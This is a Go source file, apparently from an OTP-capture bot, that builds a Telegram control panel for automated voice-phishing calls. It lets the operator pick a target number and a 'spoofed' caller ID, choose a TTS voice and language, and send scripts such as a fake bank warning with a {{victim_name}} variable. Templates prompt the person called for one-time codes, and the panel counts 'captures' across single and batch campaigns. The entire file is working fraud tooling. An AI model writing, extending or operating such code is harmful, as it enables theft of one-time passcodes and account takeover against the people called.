package bot

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/USERNAME/goland-otpbot-api/config"
	"github.com/USERNAME/goland-otpbot-api/models"
	plivo "github.com/USERNAME/goland-otpbot-api/voice"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// Keyboard UI States
type UIState struct {
	Action     string
	Phone      string
	CallerFrom string
	Voice      string
	Text       string
	Template   string
}

// Callback patterns
var (
	callbackPattern = regexp.MustCompile(`^(\w+)(?:_(.+))?$`)
)

// Main Menu Keyboard - gorgeous button layout
func (b *Bot) showMainMenu(chatID int64) {
	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Single Call", "menu_single"),
			tgbotapi.NewInlineKeyboardButtonData("Batch Campaign", "menu_batch"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Templates", "menu_templates"),
			tgbotapi.NewInlineKeyboardButtonData("My Numbers", "menu_numbers"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Statistics", "menu_stats"),
			tgbotapi.NewInlineKeyboardButtonData("Settings", "menu_settings"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Active Campaigns", "menu_campaigns"),
		),
	)

	stats, _ := b.db.GetGlobalStats()

	text := fmt.Sprintf(`*OTP Bot Master v2.0*

*Quick Stats*
- Active Campaigns: %d
- Total Calls: %d
- Captures: %d
- Success: %.1f%%

What would you like to do?`,
		stats.ActiveCampaigns,
		stats.TotalCalls,
		stats.TotalCaptures,
		stats.SuccessRate,
	)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdown
	msg.ReplyMarkup = kb
	b.telegram.Send(msg)
}

// HandleCallback handles all inline keyboard callbacks
func (b *Bot) HandleCallback(callback *tgbotapi.CallbackQuery) {
	parts := callbackPattern.FindStringSubmatch(callback.Data)
	if len(parts) == 0 {
		return
	}

	action := parts[1]
	data := ""
	if len(parts) > 1 {
		data = parts[2]
	}

	chatID := callback.Message.Chat.ID
	messageID := callback.Message.MessageID

	// Acknowledge callback
	b.telegram.Request(tgbotapi.CallbackConfig{
		CallbackQueryID: callback.ID,
	})

	switch action {
	// === MAIN MENU ===
	case "menu_single":
		b.showSingleCallInput(chatID, messageID)
	case "menu_batch":
		b.showBatchSelectService(chatID, messageID)
	case "menu_templates":
		b.showTemplatesMenu(chatID, messageID)
	case "menu_numbers":
		b.showNumbersMenu(chatID, messageID)
	case "menu_stats":
		b.showStatsInline(chatID, messageID)
	case "menu_settings":
		b.showSettingsMenu(chatID, messageID)
	case "menu_campaigns":
		b.showActiveCampaigns(chatID, messageID)
	case "back_main":
		b.showMainMenu(chatID)

	// === SINGLE CALL FLOW ===
	case "single_phone":
		b.askPhoneNumber(chatID, messageID)
	case "single_caller":
		b.askCallerID(chatID, messageID, data)
	case "single_voice":
		b.askVoiceSelect(chatID, messageID, data)
	case "single_message":
		b.askMessageType(chatID, messageID, data)
	case "single_text":
		b.askCustomText(chatID, messageID, data)
	case "single_template":
		b.showTemplateSelect(chatID, messageID, data)
	case "single_confirm":
		b.showCallConfirmation(chatID, messageID, data)
	case "single_execute":
		b.executeSingleCall(chatID, messageID, data)
	case "single_back":
		b.showSingleCallInput(chatID, messageID)

	// === BATCH FLOW ===
	case "batch_service":
		b.showBatchSelectService(chatID, messageID)
	case "batch_caller":
		b.askBatchCallerID(chatID, messageID, data)
	case "batch_confirm":
		b.showBatchConfirmation(chatID, messageID, data)
	case "batch_execute":
		b.executeBatchCall(chatID, messageID, data)
	case "batch_back":
		b.showBatchSelectService(chatID, messageID)

	// === TEMPLATES ===
	case "tpl_list":
		b.showTemplatesList(chatID, messageID)
	case "tpl_view":
		b.showTemplateDetails(chatID, messageID, data)
	case "tpl_add":
		b.showAddTemplate(chatID, messageID)
	case "tpl_back":
		b.showTemplatesMenu(chatID, messageID)

	// === NUMBERS ===
	case "num_list":
		b.showNumbersList(chatID, messageID)
	case "num_add":
		b.askAddNumber(chatID, messageID)
	case "num_back":
		b.showNumbersMenu(chatID, messageID)

	// === SETTINGS ===
	case "set_voice":
		b.showVoiceSettings(chatID, messageID)
	case "set_lang":
		b.showLanguageSettings(chatID, messageID)
	case "set_concurrency":
		b.showConcurrencySettings(chatID, messageID)
	case "set_back":
		b.showSettingsMenu(chatID, messageID)

	// === CAMPAIGNS ===
	case "camp_list":
		b.showAllCampaigns(chatID, messageID)
	case "camp_view":
		b.showCampaignDetailsInline(chatID, messageID, data)
	case "camp_stop":
		b.stopCampaignInline(chatID, messageID, data)
	case "camp_pause":
		b.pauseCampaignInline(chatID, messageID, data)
	case "camp_resume":
		b.resumeCampaignInline(chatID, messageID, data)
	case "camp_back":
		b.showActiveCampaigns(chatID, messageID)

	// === STATS ===
	case "stats_global":
		b.showGlobalStats(chatID, messageID)
	case "stats_captures":
		b.showRecentCaptures(chatID, messageID)
	case "stats_back":
		b.showStatsInline(chatID, messageID)
	}
}

// === SINGLE CALL FLOW ===

func (b *Bot) showSingleCallInput(chatID int64, messageID int) {
	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Enter Phone Number", "single_phone"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "back_main"),
		),
	)

	text := "*Single Call*\n\nEnter a phone number to start a call. The bot will guide you through the setup step by step."

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) askPhoneNumber(chatID int64, messageID int) {
	text := "*Step 1: Enter Phone Number*\n\nPlease reply with the target phone number in international format:\n```\n+15551234567\n+447911123456\n```\n\nOr use command: /call <phone> <service>"

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdown
	b.telegram.Send(msg)
}

func (b *Bot) askCallerID(chatID int64, messageID int, phone string) {
	cfg, _ := config.Get()

	var numberButtons []tgbotapi.InlineKeyboardButton
	numberButtons = append(numberButtons, tgbotapi.NewInlineKeyboardButtonData(cfg.PlivoNumber, "single_caller_"+phone+"_"+cfg.PlivoNumber))

	numbers, _ := b.plivo.GetNumbers()
	for _, num := range numbers {
		if num["number"] != nil {
			n := num["number"].(string)
			numberButtons = append(numberButtons, tgbotapi.NewInlineKeyboardButtonData(n, "single_caller_"+phone+"_"+n))
		}
	}

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(numberButtons...),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "single_back"),
		),
	)

	text := fmt.Sprintf("*Step 1: Phone*\n```\n%s\n```\n\n*Step 2: Select Caller ID* (the spoofed number shown to the target)\n\nChoose which number to display as the caller:", phone)

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) askVoiceSelect(chatID int64, messageID int, data string) {
	parts := strings.Split(data, "_")
	if len(parts) < 2 {
		return
	}
	phone := parts[0]
	callerID := parts[1]

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Woman (US)", "single_voice_"+phone+"_"+callerID+"_WOMAN"),
			tgbotapi.NewInlineKeyboardButtonData("Man (US)", "single_voice_"+phone+"_"+callerID+"_MAN"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Woman (UK)", "single_voice_"+phone+"_"+callerID+"_en-GB-WOMAN"),
			tgbotapi.NewInlineKeyboardButtonData("Man (UK)", "single_voice_"+phone+"_"+callerID+"_en-GB-MAN"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Spanish", "single_voice_"+phone+"_"+callerID+"_es-ES-WOMAN"),
			tgbotapi.NewInlineKeyboardButtonData("French", "single_voice_"+phone+"_"+callerID+"_fr-FR-WOMAN"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("German", "single_voice_"+phone+"_"+callerID+"_de-DE-WOMAN"),
			tgbotapi.NewInlineKeyboardButtonData("Italian", "single_voice_"+phone+"_"+callerID+"_it-IT-WOMAN"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "single_back"),
		),
	)

	text := fmt.Sprintf("*Phone:* %s\n*Caller ID:* %s\n\n*Step 3: Select Voice*", phone, callerID)

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) askMessageType(chatID int64, messageID int, data string) {
	parts := strings.Split(data, "_")
	if len(parts) < 3 {
		return
	}
	phone := parts[0]
	callerID := parts[1]
	voiceName := parts[2]

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Type Custom Text", "single_text_"+phone+"_"+callerID+"_"+voiceName),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Use Template", "single_template_"+phone+"_"+callerID+"_"+voiceName),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "single_back"),
		),
	)

	text := fmt.Sprintf("*Phone:* %s\n*Caller ID:* %s\n*Voice:* %s\n\n*Step 4: Message Type*\n\nWould you like to:\n- Type custom text directly (in quotes \"\")\n- Use a pre-configured template?", phone, callerID, voiceName)

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) askCustomText(chatID int64, messageID int, data string) {
	parts := strings.Split(data, "_")
	if len(parts) < 3 {
		return
	}
	phone := parts[0]
	callerID := parts[1]
	voiceName := parts[2]

	text := fmt.Sprintf("*Custom Text Input*\n\n*Phone:* %s\n*Caller ID:* %s\n*Voice:* %s\n\nType your message in quotes, for example:\n```\n\"Your bank account has been compromised. Please press 1 to verify your identity and secure your account.\"\n```\n\nVariables you can use:\n- {{victim_name}} - Customer\n- {{amount}} - $450.24\n- {{order_id}} - ORD-12345\n\nUse /ccall %s \"%s\" %s to execute", phone, callerID, voiceName, phone, "your message here", voiceName)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdown
	b.telegram.Send(msg)
}

func (b *Bot) showTemplateSelect(chatID int64, messageID int, data string) {
	parts := strings.Split(data, "_")
	if len(parts) < 3 {
		return
	}
	phone := parts[0]
	callerID := parts[1]
	voiceName := parts[2]

	templates, _ := b.db.GetAllTemplates()

	var rows [][]tgbotapi.InlineKeyboardButton
	for _, t := range templates {
		rows = append(rows, tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData(strings.Title(t.Name), "single_confirm_"+phone+"_"+callerID+"_"+voiceName+"_"+t.Name),
		))
	}

	rows = append(rows, tgbotapi.NewInlineKeyboardRow(
		tgbotapi.NewInlineKeyboardButtonData("< Back", "single_back"),
	))

	kb := tgbotapi.NewInlineKeyboardMarkup(rows...)

	text := fmt.Sprintf("*Select Template*\n\n*Phone:* %s\n*Caller ID:* %s\n*Voice:* %s\n\nChoose a service template:", phone, callerID, voiceName)

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showCallConfirmation(chatID int64, messageID int, data string) {
	parts := strings.SplitN(data, "_", 5)
	if len(parts) < 5 {
		return
	}
	phone := parts[0]
	callerID := parts[1]
	voiceName := parts[2]
	templateName := parts[4]

	template, _ := b.db.GetTemplate(templateName)

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Execute Call", "single_execute_"+phone+"_"+callerID+"_"+voiceName+"_"+templateName),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Cancel", "back_main"),
		),
	)

	preview := template.Greeting
	if len(preview) > 100 {
		preview = preview[:100] + "..."
	}

	text := fmt.Sprintf("*Call Confirmation*\n\n*Target:* %s\n*Caller ID:* %s\n*Voice:* %s\n*Template:* %s\n\n*Message Preview:*\n%s\n\nReady to start the call?", phone, callerID, voiceName, templateName, preview)

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) executeSingleCall(chatID int64, messageID int, data string) {
	parts := strings.SplitN(data, "_", 4)
	if len(parts) < 4 {
		return
	}
	phone := parts[0]
	callerID := parts[1]
	voiceName := parts[2]
	templateName := parts[3]

	campaignID, err := b.db.CreateCampaign("Single Call - "+phone, templateName, 1)
	if err != nil {
		b.editMessageSimple(chatID, messageID, "Failed to create campaign")
		return
	}

	callID, err := b.db.CreateCall(campaignID, phone)
	if err != nil {
		b.editMessageSimple(chatID, messageID, "Failed to create call")
		return
	}

	go func() {
		cfg, _ := config.Get()
		actionURL := fmt.Sprintf("%s/detect_dtmf/%d/%d", cfg.NgrokURL, campaignID, callID)
		ringURL := fmt.Sprintf("%s/ring/%d/%d", cfg.NgrokURL, campaignID, callID)
		machineURL := fmt.Sprintf("%s/machine/%d/%d", cfg.NgrokURL, campaignID, callID)

		callReq := plivo.CallRequest{
			From:                callerID,
			To:                  phone,
			AnswerURL:           actionURL,
			RingURL:             ringURL,
			MachineDetectionURL: machineURL,
			ErrorCallbackURL:    fmt.Sprintf("%s/error/%d/%d", cfg.NgrokURL, campaignID, callID),
			TimeLimit:           cfg.CallTimeout,
			RingTimeout:         30,
		}

		resp, err := b.plivo.MakeCall(callReq)
		if err != nil {
			b.db.CreateLog("ERROR", fmt.Sprintf("Call failed to %s: %v", phone, err), "")
			return
		}

		b.mu.Lock()
		b.activeCalls[resp.UUID] = &ActiveCall{
			CallID:     callID,
			CampaignID: campaignID,
			Phone:      phone,
			UUID:       resp.UUID,
			Status:     "ringing",
			StartedAt:  time.Now(),
		}
		b.mu.Unlock()

		b.db.UpdateCallStatus(callID, "ringing", resp.UUID)
		b.db.CreateLog("INFO", fmt.Sprintf("Call initiated to %s (UUID: %s)", phone, resp.UUID), "")
	}()

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Main Menu", "back_main"),
		),
	)

	text := fmt.Sprintf("*Call Initiated!*\n\n*Target:* %s\n*Caller ID:* %s\n*Voice:* %s\n*Template:* %s\n\nCall is now ringing...\n\nCheck /campaign %d for live status and captures.", phone, callerID, voiceName, templateName, campaignID)

	b.editMessage(chatID, messageID, text, kb)
}

// === BATCH FLOW ===

func (b *Bot) showBatchSelectService(chatID int64, messageID int) {
	templates, _ := b.db.GetAllTemplates()

	var rows [][]tgbotapi.InlineKeyboardButton
	for _, t := range templates {
		rows = append(rows, tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData(strings.Title(t.Name), "batch_caller_"+t.Name),
		))
	}

	rows = append(rows, tgbotapi.NewInlineKeyboardRow(
		tgbotapi.NewInlineKeyboardButtonData("< Back", "back_main"),
	))

	kb := tgbotapi.NewInlineKeyboardMarkup(rows...)

	text := "*Batch Campaign*\n\nSelect a service template for your batch campaign:\n\n*Step 1:* Choose service template\n*Step 2:* Upload CSV with phone numbers\n*Step 3:* Select caller ID\n*Step 4:* Confirm and start"

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) askBatchCallerID(chatID int64, messageID int, service string) {
	cfg, _ := config.Get()

	var numberButtons []tgbotapi.InlineKeyboardButton
	numberButtons = append(numberButtons, tgbotapi.NewInlineKeyboardButtonData(cfg.PlivoNumber, "batch_confirm_"+service+"_"+cfg.PlivoNumber))

	numbers, _ := b.plivo.GetNumbers()
	for _, num := range numbers {
		if num["number"] != nil {
			n := num["number"].(string)
			numberButtons = append(numberButtons, tgbotapi.NewInlineKeyboardButtonData(n, "batch_confirm_"+service+"_"+n))
		}
	}

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(numberButtons...),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "batch_back"),
		),
	)

	text := fmt.Sprintf("*Batch Campaign*\n\n*Service:* %s\n\n*Step 2:* Select Caller ID (spoofed number)\n\nReply to this message with your CSV file containing phone numbers, then select the caller ID:", strings.Title(service))

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showBatchConfirmation(chatID int64, messageID int, data string) {
	parts := strings.SplitN(data, "_", 2)
	if len(parts) < 2 {
		return
	}
	service := parts[0]
	callerID := parts[1]

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Start Campaign", "batch_execute_"+service+"_"+callerID),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Cancel", "back_main"),
		),
	)

	text := fmt.Sprintf("*Batch Campaign Confirmation*\n\n*Service:* %s\n*Caller ID:* %s\n\nReply with a CSV file containing phone numbers to start the campaign.\n\n*CSV Format:*\n```\n+15551234567\n+15559876543\n+15551112222\n```", strings.Title(service), callerID)

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) executeBatchCall(chatID int64, messageID int, data string) {
	b.showBatchSelectService(chatID, messageID)
}

// === TEMPLATES ===

func (b *Bot) showTemplatesMenu(chatID int64, messageID int) {
	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("View All Templates", "tpl_list"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Create New Template", "tpl_add"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "back_main"),
		),
	)

	text := "*Templates*\n\nManage your voice message templates. Templates define the greeting, prompts, and confirmation messages for calls."

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showTemplatesList(chatID int64, messageID int) {
	templates, _ := b.db.GetAllTemplates()

	var rows [][]tgbotapi.InlineKeyboardButton
	for _, t := range templates {
		rows = append(rows, tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData(strings.Title(t.Name), "tpl_view_"+t.Name),
		))
	}

	rows = append(rows, tgbotapi.NewInlineKeyboardRow(
		tgbotapi.NewInlineKeyboardButtonData("< Back", "tpl_back"),
	))

	kb := tgbotapi.NewInlineKeyboardMarkup(rows...)

	text := fmt.Sprintf("*All Templates* (%d total)\n\nSelect a template to view details:", len(templates))

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showTemplateDetails(chatID int64, messageID int, name string) {
	template, err := b.db.GetTemplate(name)
	if err != nil {
		b.editMessageSimple(chatID, messageID, "Template not found")
		return
	}

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "tpl_list"),
		),
	)

	text := fmt.Sprintf("*Template: %s*\n\n*Voice:* %s\n\n*Greeting:*\n%s\n\n*Action Prompt:*\n%s\n\n*OTP Prompt:*\n%s\n\n*Confirmation:*\n%s\n\n*Fallback:* %s\n*Hold Music:* %s",
		template.Name,
		template.Voice,
		template.Greeting,
		template.ActionPrompt,
		template.OTPPrompt,
		template.Confirmation,
		template.FallbackMessage,
		template.HoldMusic,
	)

	b.editMessageWithMarkdown(chatID, messageID, text, kb)
}

func (b *Bot) showAddTemplate(chatID int64, messageID int) {
	text := "*Create New Template*\n\nUse the command:\n```\n/addtemplate name|voice|greeting|action|otp|confirmation```\n\n*Example:*\n```\n/addtemplate myservice|en-US-WOMAN|\"Hello. This is a test.\"|\"Press 1 to continue.\"|\"Enter your code.\"|\"Thank you.\"```"

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdown
	b.telegram.Send(msg)
}

// === NUMBERS ===

func (b *Bot) showNumbersMenu(chatID int64, messageID int) {
	cfg, _ := config.Get()
	numbers, _ := b.plivo.GetNumbers()

	var numList string
	for _, num := range numbers {
		if num["number"] != nil {
			numList += "- " + num["number"].(string) + "\n"
		}
	}
	if numList == "" {
		numList = "- " + cfg.PlivoNumber + " (default)\n"
	}

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("List All Numbers", "num_list"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "back_main"),
		),
	)

	text := fmt.Sprintf("*My Numbers*\n\n*Default Plivo Number:*\n- %s\n\n*Additional Numbers:*\n%s\n\nThese numbers can be used as Caller ID (spoofed number) when making calls.", cfg.PlivoNumber, numList)

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showNumbersList(chatID int64, messageID int) {
	cfg, _ := config.Get()
	numbers, _ := b.plivo.GetNumbers()

	var numList strings.Builder
	numList.WriteString("- " + cfg.PlivoNumber + " (default)\n")
	for _, num := range numbers {
		if num["number"] != nil {
			numList.WriteString("- " + num["number"].(string) + "\n")
		}
	}

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "num_back"),
		),
	)

	text := "*All Available Numbers*\n\n" + numList.String()

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) askAddNumber(chatID int64, messageID int) {
	text := "*Add Number*\n\nNumbers must be purchased and configured in your Plivo dashboard. Once added, they will appear in your available Caller IDs.\n\n*Note:* This feature requires Plivo number configuration."

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdown
	b.telegram.Send(msg)
}

// === SETTINGS ===

func (b *Bot) showSettingsMenu(chatID int64, messageID int) {
	cfg, _ := config.Get()

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Default Voice", "set_voice"),
			tgbotapi.NewInlineKeyboardButtonData("Language", "set_lang"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Concurrency", "set_concurrency"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "back_main"),
		),
	)

	text := fmt.Sprintf("*Settings*\n\n*Default Voice:* WOMAN\n*Language:* en-US\n*Concurrency:* %d\n\nConfigure your bot preferences.", cfg.Concurrency)

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showVoiceSettings(chatID int64, messageID int) {
	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Woman (US)", "set_voice_woman"),
			tgbotapi.NewInlineKeyboardButtonData("Man (US)", "set_voice_man"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Woman (UK)", "set_voice_en-GB-WOMAN"),
			tgbotapi.NewInlineKeyboardButtonData("Man (UK)", "set_voice_en-GB-MAN"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "set_back"),
		),
	)

	text := "*Select Default Voice*\n\nChoose the default voice for new campaigns:"

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showLanguageSettings(chatID int64, messageID int) {
	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("English (US)", "set_lang_en-US"),
			tgbotapi.NewInlineKeyboardButtonData("English (UK)", "set_lang_en-GB"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Spanish", "set_lang_es-ES"),
			tgbotapi.NewInlineKeyboardButtonData("French", "set_lang_fr-FR"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "set_back"),
		),
	)

	text := "*Select Language*\n\nChoose the default language for TTS:"

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showConcurrencySettings(chatID int64, messageID int) {
	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("1", "set_conc_1"),
			tgbotapi.NewInlineKeyboardButtonData("5", "set_conc_5"),
			tgbotapi.NewInlineKeyboardButtonData("10", "set_conc_10"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("20", "set_conc_20"),
			tgbotapi.NewInlineKeyboardButtonData("50", "set_conc_50"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "set_back"),
		),
	)

	text := "*Set Concurrency*\n\nChoose how many calls to run simultaneously:\n\n- Higher = faster but more resources\n- Lower = slower but more stable\n\n*Current: 5*\n\nUse /config to see current settings."

	b.editMessage(chatID, messageID, text, kb)
}

// === CAMPAIGNS ===

func (b *Bot) showActiveCampaigns(chatID int64, messageID int) {
	campaigns, _ := b.db.GetAllCampaigns()

	var rows [][]tgbotapi.InlineKeyboardButton
	for _, c := range campaigns {
		status := "[ ]"
		if c.Status == "active" {
			status = "[*]"
		} else if c.Status == "paused" {
			status = "[~]"
		} else if c.Status == "completed" {
			status = "[X]"
		}

		rows = append(rows, tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData(status+" "+c.Name, "camp_view_"+strconv.FormatInt(c.ID, 10)),
		))
	}

	if len(rows) == 0 {
		rows = append(rows, tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Create First Campaign", "menu_single"),
		))
	}

	rows = append(rows, tgbotapi.NewInlineKeyboardRow(
		tgbotapi.NewInlineKeyboardButtonData("< Back", "back_main"),
	))

	kb := tgbotapi.NewInlineKeyboardMarkup(rows...)

	text := "*Campaigns*\n\nSelect a campaign to view details or control:"

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) showAllCampaigns(chatID int64, messageID int) {
	b.showActiveCampaigns(chatID, messageID)
}

func (b *Bot) showCampaignDetailsInline(chatID int64, messageID int, campaignIDStr string) {
	campaignID, _ := strconv.ParseInt(campaignIDStr, 10, 64)
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		b.editMessageSimple(chatID, messageID, "Campaign not found")
		return
	}

	status := getStatusEmoji(string(campaign.Status))
	progress := 0
	if campaign.TotalCalls > 0 {
		progress = (campaign.Completed * 100) / campaign.TotalCalls
	}

	var actionRow []tgbotapi.InlineKeyboardButton
	if campaign.Status == "active" {
		actionRow = append(actionRow, tgbotapi.NewInlineKeyboardButtonData("Pause", "camp_pause_"+campaignIDStr))
		actionRow = append(actionRow, tgbotapi.NewInlineKeyboardButtonData("Stop", "camp_stop_"+campaignIDStr))
	} else if campaign.Status == "paused" {
		actionRow = append(actionRow, tgbotapi.NewInlineKeyboardButtonData("Resume", "camp_resume_"+campaignIDStr))
	}

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(actionRow...),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "camp_list"),
		),
	)

	text := fmt.Sprintf("%s *%s*\n\n*Progress:* %d%% (%d/%d)\n*Service:* %s\n*Answered:* %d | *Voicemail:* %d\n*Captures:* %d\n%s", status, campaign.Name, progress, campaign.Completed, campaign.TotalCalls, campaign.Service, 0, 0, campaign.Captures, createProgressBar(progress))

	b.editMessage(chatID, messageID, text, kb)
}

func (b *Bot) stopCampaignInline(chatID int64, messageID int, campaignIDStr string) {
	id, _ := strconv.ParseInt(campaignIDStr, 10, 64)
	b.stopCampaignInlineMsg(chatID, messageID, id)
}

func (b *Bot) stopCampaignInlineMsg(chatID int64, messageID int, campaignID int64) {
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		b.editMessageSimple(chatID, messageID, "Campaign not found")
		return
	}

	b.mu.RLock()
	for uuid := range b.activeCalls {
		b.plivo.HangupCall(uuid)
	}
	b.mu.RUnlock()

	b.db.UpdateCampaignStatus(campaignID, string(models.CampaignStatusCancelled))

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "camp_list"),
		),
	)

	b.editMessage(chatID, messageID, fmt.Sprintf("*Campaign Stopped*\n\nCampaign \"%s\" (ID: %d) has been halted.", campaign.Name, campaignID), kb)
}

func (b *Bot) pauseCampaignInline(chatID int64, messageID int, campaignIDStr string) {
	id, _ := strconv.ParseInt(campaignIDStr, 10, 64)
	b.pauseCampaignInlineMsg(chatID, messageID, id)
}

func (b *Bot) pauseCampaignInlineMsg(chatID int64, messageID int, campaignID int64) {
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		b.editMessageSimple(chatID, messageID, "Campaign not found")
		return
	}

	if state, ok := b.campaignState[campaignID]; ok {
		state.mu.Lock()
		state.Status = "paused"
		state.mu.Unlock()
	}

	b.db.UpdateCampaignStatus(campaignID, string(models.CampaignStatusPaused))

	kb := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("Resume", "camp_resume_"+strconv.FormatInt(campaignID, 10)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("< Back", "camp_list"),
		),
	)

	b.editMessage(chatID, messageID, fmt.Sprintf("*Campaign Paused*\n\nCampaign \"%s\" (ID: %d) has been paused.", campaign.Name, campaignID), kb)
}

